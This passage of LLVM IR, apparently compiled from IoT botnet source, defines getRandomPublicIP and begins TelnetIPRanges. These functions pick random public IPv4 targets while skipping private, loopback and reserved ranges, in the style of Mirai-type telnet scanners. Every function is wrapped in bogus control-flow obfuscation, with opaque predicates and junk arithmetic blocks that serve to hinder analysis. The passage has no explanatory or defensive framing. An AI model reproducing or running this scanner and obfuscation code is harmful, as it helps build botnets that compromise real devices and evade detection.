  br i1 %161, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %152
  %162 = load i32, i32* @x.53
  %163 = load i32, i32* @y.54
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %153, label %170, label %189

; <label>:170:                                    ; preds = %originalBBpart246
  %171 = load i32, i32* @x.53
  %172 = load i32, i32* @y.54
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %170
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %7, align 4
  %181 = load i32, i32* @x.53
  %182 = load i32, i32* @y.54
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart259, label %originalBB48alteredBB

originalBBpart259:                                ; preds = %originalBB48
  br label %34

; <label>:189:                                    ; preds = %originalBBpart246
  %190 = load i8*, i8** %3, align 8
  %191 = load i32, i32* %5, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = load i32, i32* %7, align 4
  %195 = sext i32 %194 to i64
  %196 = sub i64 0, %195
  %197 = getelementptr inbounds i8, i8* %193, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = sext i8 %198 to i32
  %200 = load i8*, i8** %4, align 8
  %201 = load i32, i32* %6, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i8, i8* %200, i64 %202
  %204 = load i8, i8* %203, align 1
  %205 = sext i8 %204 to i32
  %206 = icmp eq i32 %199, %205
  br i1 %206, label %207, label %224

; <label>:207:                                    ; preds = %189
  %208 = load i32, i32* @x.53
  %209 = load i32, i32* @y.54
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %207
  store i32 1, i32* %2, align 4
  %216 = load i32, i32* @x.53
  %217 = load i32, i32* @y.54
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %245

; <label>:224:                                    ; preds = %189
  br label %225

; <label>:225:                                    ; preds = %224
  %226 = load i32, i32* %6, align 4
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %6, align 4
  br label %11

; <label>:228:                                    ; preds = %11
  %229 = load i32, i32* @x.53
  %230 = load i32, i32* @y.54
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %228
  store i32 0, i32* %2, align 4
  %237 = load i32, i32* @x.53
  %238 = load i32, i32* @y.54
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %245

; <label>:245:                                    ; preds = %originalBBpart267, %originalBBpart263
  %246 = load i32, i32* %2, align 4
  ret i32 %246

originalBBalteredBB:                              ; preds = %originalBB, %17
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %247 = load i8*, i8** %3, align 8
  %248 = load i32, i32* %5, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds i8, i8* %247, i64 %249
  %251 = load i32, i32* %7, align 4
  %252 = sext i32 %251 to i64
  %_ = shl i64 0, %252
  %_2 = sub i64 0, %252
  %gen = mul i64 %_2, %252
  %_3 = sub i64 0, 0
  %gen4 = add i64 %_3, %252
  %_5 = sub i64 0, %252
  %gen6 = mul i64 %_5, %252
  %_7 = sub i64 0, 0
  %gen8 = add i64 %_7, %252
  %_9 = sub i64 0, 0
  %gen10 = add i64 %_9, %252
  %_11 = shl i64 0, %252
  %_12 = sub i64 0, %252
  %gen13 = mul i64 %_12, %252
  %253 = sub i64 0, %252
  %254 = getelementptr inbounds i8, i8* %250, i64 %253
  %255 = load i8, i8* %254, align 1
  %256 = sext i8 %255 to i32
  %257 = icmp eq i32 %256, 0
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %78
  %258 = load i8*, i8** %3, align 8
  %259 = load i32, i32* %5, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8, i8* %258, i64 %260
  %262 = load i32, i32* %7, align 4
  %263 = sext i32 %262 to i64
  %_18 = sub i64 0, %263
  %gen19 = mul i64 %_18, %263
  %_20 = sub i64 0, 0
  %gen21 = add i64 %_20, %263
  %_22 = shl i64 0, %263
  %_23 = shl i64 0, %263
  %_24 = sub i64 0, %263
  %gen25 = mul i64 %_24, %263
  %_26 = sub i64 0, %263
  %gen27 = mul i64 %_26, %263
  %264 = sub i64 0, %263
  %265 = getelementptr inbounds i8, i8* %261, i64 %264
  %266 = load i8, i8* %265, align 1
  %267 = sext i8 %266 to i32
  %268 = icmp eq i32 %267, 13
  br label %originalBB17

originalBB31alteredBB:                            ; preds = %originalBB31, %106
  %269 = load i8*, i8** %3, align 8
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  %273 = load i32, i32* %7, align 4
  %274 = sext i32 %273 to i64
  %_32 = shl i64 0, %274
  %_33 = sub i64 0, 0
  %gen34 = add i64 %_33, %274
  %_35 = shl i64 0, %274
  %_36 = shl i64 0, %274
  %275 = sub i64 0, %274
  %276 = getelementptr inbounds i8, i8* %272, i64 %275
  %277 = load i8, i8* %276, align 1
  %278 = sext i8 %277 to i32
  %279 = icmp eq i32 %278, 10
  br label %originalBB31

originalBB40alteredBB:                            ; preds = %originalBB40, %134
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %152
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %170
  %280 = load i32, i32* %7, align 4
  %_49 = sub i32 %280, 1
  %gen50 = mul i32 %_49, 1
  %_51 = sub i32 %280, 1
  %gen52 = mul i32 %_51, 1
  %_53 = sub i32 0, %280
  %gen54 = add i32 %_53, 1
  %_55 = sub i32 %280, 1
  %gen56 = mul i32 %_55, 1
  %_57 = shl i32 %280, 1
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %7, align 4
  br label %originalBB48

originalBB61alteredBB:                            ; preds = %originalBB61, %207
  store i32 1, i32* %2, align 4
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %228
  store i32 0, i32* %2, align 4
  br label %originalBB65
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %originalBBpart234, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %210, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %210, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %210, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %210, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %210, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %74

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* @x.55
  %52 = load i32, i32* @y.56
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp sle i32 %60, 16
  %62 = load i32, i32* @x.55
  %63 = load i32, i32* @y.56
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %70, label %74

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp sle i32 %72, 31
  br i1 %73, label %210, label %74

; <label>:74:                                     ; preds = %70, %originalBBpart2, %46
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 192
  br i1 %77, label %78, label %102

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @x.55
  %80 = load i32, i32* @y.56
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 0
  %90 = load i32, i32* @x.55
  %91 = load i32, i32* @y.56
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %89, label %98, label %102

; <label>:98:                                     ; preds = %originalBBpart24
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 2
  br i1 %101, label %210, label %102

; <label>:102:                                    ; preds = %98, %originalBBpart24, %74
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 192
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 88
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 99
  br i1 %113, label %210, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 192
  br i1 %117, label %118, label %122

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 168
  br i1 %121, label %210, label %122

; <label>:122:                                    ; preds = %118, %114
  %123 = load i32, i32* @x.55
  %124 = load i32, i32* @y.56
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %122
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 198
  %134 = load i32, i32* @x.55
  %135 = load i32, i32* @y.56
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %133, label %142, label %150

; <label>:142:                                    ; preds = %originalBBpart28
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 18
  br i1 %145, label %210, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 19
  br i1 %149, label %210, label %150

; <label>:150:                                    ; preds = %146, %originalBBpart28
  %151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 198
  br i1 %153, label %154, label %162

; <label>:154:                                    ; preds = %150
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 51
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %154
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 100
  br i1 %161, label %210, label %162

; <label>:162:                                    ; preds = %158, %154, %150
  %163 = load i32, i32* @x.55
  %164 = load i32, i32* @y.56
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %162
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 203
  %174 = load i32, i32* @x.55
  %175 = load i32, i32* @y.56
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %173, label %182, label %206

; <label>:182:                                    ; preds = %originalBBpart212
  %183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %186, label %206

; <label>:186:                                    ; preds = %182
  %187 = load i32, i32* @x.55
  %188 = load i32, i32* @y.56
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %186
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 113
  %198 = load i32, i32* @x.55
  %199 = load i32, i32* @y.56
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %197, label %210, label %206

; <label>:206:                                    ; preds = %originalBBpart216, %182, %originalBBpart212
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp sge i32 %208, 224
  br label %210

; <label>:210:                                    ; preds = %206, %originalBBpart216, %158, %146, %142, %118, %110, %98, %70, %42, %34, %30, %18, %14
  %211 = phi i1 [ true, %originalBBpart216 ], [ true, %158 ], [ true, %146 ], [ true, %142 ], [ true, %118 ], [ true, %110 ], [ true, %98 ], [ true, %70 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %209, %206 ]
  br i1 %211, label %212, label %241

; <label>:212:                                    ; preds = %210
  %213 = load i32, i32* @x.55
  %214 = load i32, i32* @y.56
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %212
  %221 = call i32 @rand() #5
  %222 = srem i32 %221, 223
  %223 = trunc i32 %222 to i8
  store i8 %223, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %224 = call i32 @rand() #5
  %225 = srem i32 %224, 255
  %226 = trunc i32 %225 to i8
  store i8 %226, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %227 = call i32 @rand() #5
  %228 = srem i32 %227, 255
  %229 = trunc i32 %228 to i8
  store i8 %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %230 = call i32 @rand() #5
  %231 = srem i32 %230, 255
  %232 = trunc i32 %231 to i8
  store i8 %232, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %233 = load i32, i32* @x.55
  %234 = load i32, i32* @y.56
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart234, label %originalBB18alteredBB

originalBBpart234:                                ; preds = %originalBB18
  br label %14

; <label>:241:                                    ; preds = %210
  %242 = load i32, i32* @x.55
  %243 = load i32, i32* @y.56
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %241
  %250 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %250, i8 0, i64 16, i32 16, i1 false)
  %251 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %252 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %253 = zext i8 %252 to i32
  %254 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %255 = zext i8 %254 to i32
  %256 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %257 = zext i8 %256 to i32
  %258 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %259 = zext i8 %258 to i32
  %260 = call i32 (i8*, i8*, ...) @szprintf(i8* %251, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %253, i32 %255, i32 %257, i32 %259)
  %261 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %262 = call i32 @inet_addr(i8* %261) #5
  %263 = load i32, i32* @x.55
  %264 = load i32, i32* @y.56
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  ret i32 %262

originalBBalteredBB:                              ; preds = %originalBB, %50
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp sle i32 %272, 16
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %274 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %122
  %277 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 198
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %162
  %280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 203
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %186
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 113
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %212
  %286 = call i32 @rand() #5
  %_ = sub i32 0, %286
  %gen = add i32 %_, 223
  %_19 = sub i32 %286, 223
  %gen20 = mul i32 %_19, 223
  %287 = srem i32 %286, 223
  %288 = trunc i32 %287 to i8
  store i8 %288, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %289 = call i32 @rand() #5
  %_21 = shl i32 %289, 255
  %_22 = shl i32 %289, 255
  %_23 = sub i32 0, %289
  %gen24 = add i32 %_23, 255
  %_25 = sub i32 %289, 255
  %gen26 = mul i32 %_25, 255
  %_27 = sub i32 %289, 255
  %gen28 = mul i32 %_27, 255
  %290 = srem i32 %289, 255
  %291 = trunc i32 %290 to i8
  store i8 %291, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %292 = call i32 @rand() #5
  %_29 = sub i32 0, %292
  %gen30 = add i32 %_29, 255
  %_31 = shl i32 %292, 255
  %293 = srem i32 %292, 255
  %294 = trunc i32 %293 to i8
  store i8 %294, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %295 = call i32 @rand() #5
  %_32 = shl i32 %295, 255
  %296 = srem i32 %295, 255
  %297 = trunc i32 %296 to i8
  store i8 %297, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %originalBB18

originalBB36alteredBB:                            ; preds = %originalBB36, %241
  %298 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %298, i8 0, i64 16, i32 16, i1 false)
  %299 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %301 = zext i8 %300 to i32
  %302 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %303 = zext i8 %302 to i32
  %304 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %305 = zext i8 %304 to i32
  %306 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %307 = zext i8 %306 to i32
  %308 = call i32 (i8*, i8*, ...) @szprintf(i8* %299, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %301, i32 %303, i32 %305, i32 %307)
  %309 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %310 = call i32 @inet_addr(i8* %309) #5
  br label %originalBB36
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @TelnetIPRanges() #0 {
  %1 = load i32, i32* @x.57
  %2 = load i32, i32* @y.58
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [16 x i8], align 16
  %10 = call i32 @rand() #5
  %11 = srem i32 %10, 223
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %13 = call i32 @rand() #5
  %14 = srem i32 %13, 255
  %15 = trunc i32 %14 to i8
